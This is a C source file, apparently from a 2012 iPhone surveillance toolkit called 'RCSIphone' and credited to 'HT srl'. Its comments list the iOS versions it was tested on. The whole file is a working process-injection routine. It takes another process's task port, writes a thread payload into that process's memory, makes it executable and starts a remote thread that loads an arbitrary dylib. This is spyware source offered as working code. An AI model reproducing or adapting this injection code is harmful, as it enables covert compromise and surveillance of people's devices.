//
//  RCSIProcInjection.c
//  RCSIphone
//
//  Created by kiodo on 26/04/12.
//  Copyright 2012 HT srl. All rights reserved.
//
// tested against:
// 
// (3.1.3 3gs) Darwin iPhone3gs 10.0.0d3 Darwin Kernel Version 10.0.0d3: Fri Dec 18 01:34:28 PST 2009; root:xnu-1357.5.30~6/
//             RELEASE_ARM_S5L8920X iPhone2,1 arm N88AP Darwin
// (4.0.0 3g)  Darwin iPhone3g 10.3.1 Darwin Kernel Version 10.3.1: Wed May 26 22:13:30 PDT 2010; root:xnu-1504.50.73~2/
//             RELEASE_ARM_S5L8900X iPhone1,2 arm N82AP Darwin
// (4.1.0 3gs) Darwin iPhone3gs 10.3.1 Darwin Kernel Version 10.3.1: Wed Aug  4 22:29:51 PDT 2010; root:xnu-1504.55.33~10/
//             RELEASE_ARM_S5L8920X iPhone2,1 arm N88AP Darwin
// (4.3.3 4g)  Darwin iPhone4g 11.0.0 Darwin Kernel Version 11.0.0: Wed Mar 30 18:51:10 PDT 2011; root:xnu-1735.46~10/RELEASE_ARM_S5L8930X
//             iPhone3,1 arm N90AP Darwin
// (5.0.1 4g)  Darwin iPhone 11.0.0 Darwin Kernel Version 11.0.0: Tue Nov  1 20:33:58 PDT 2011; root:xnu-1878.4.46~1/RELEASE_ARM_S5L8930X
//             iPhone3,1 arm N90AP Darwin
// (4.3.3 iPad)Darwin iPad 11.0.0 Darwin Kernel Version 11.0.0: Wed Mar 30 18:51:10 PDT 2011; root:xnu-1735.46~10/RELEASE_ARM_S5L8930X
//             iPad1,1 arm K48AP Darwin

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>

kern_return_t injectDylibToProc(pid_t pid, const char *path);

extern char rThread[];
extern char rThread_end[];
extern char dylib_path[64];
extern char insert_lib[64];

static mach_vm_size_t stack_size = 2*PAGE_SIZE;

kern_return_t injectDylibToProc(pid_t pid, const char *path) 
{
  struct _opaque_pthread_t d;
  mach_vm_size_t rThread_size = rThread_end - rThread;
  kern_return_t kret;
  task_t task;
  int t;
  
  t = sizeof(d);
  
  static union {
    _STRUCT_ARM_THREAD_STATE arm;
    natural_t natural;
  } thdState = { { .__cpsr = 0x20 } };
  
  kret = task_for_pid(mach_task_self(), (int) pid, &task);
  
  if (kret != KERN_SUCCESS)
      return kret;
  
  vm_address_t stack_address = VM_MIN_ADDRESS;
  kret = vm_allocate(task, &stack_address, stack_size, VM_FLAGS_ANYWHERE);
  
  if (kret != KERN_SUCCESS)
    return kret;
  
  mach_vm_address_t rThread_address = stack_address + stack_size - rThread_size;
  
  strlcpy(dylib_path, path, 64);
  strlcpy(insert_lib, "DYLD_INSERT_LIBRARIES", 64);
  
  kret =  vm_protect(task, 
                     stack_address, 
                     stack_size, 
                     false, 
                     VM_PROT_READ | VM_PROT_WRITE);
  
  if (kret != KERN_SUCCESS)
    return kret;
  
  kret = vm_write(task, rThread_address, (vm_offset_t) rThread, rThread_size);
  
  if (kret != KERN_SUCCESS)
    return kret;
  
  thdState.arm.__pc = rThread_address;
  thdState.arm.__sp = (uint32_t) stack_address + stack_size - PAGE_SIZE;
  
  vm_machine_attribute_val_t value = MATTR_VAL_CACHE_FLUSH; 
  vm_machine_attribute(task, rThread_address, rThread_size, MATTR_CACHE, &value);
 
  kret = vm_protect(task, 
                    rThread_address, 
                    rThread_size, 
                    false, 
                    VM_PROT_READ | VM_PROT_EXECUTE);
  
  if (kret != KERN_SUCCESS)
    return kret;
  
  thread_act_t theThread;
  kret = thread_create_running(task, 
                               ARM_THREAD_STATE, 
                               &thdState.natural, 
                               ARM_THREAD_STATE_COUNT, 
                               &theThread);
  
  return kret;    
}
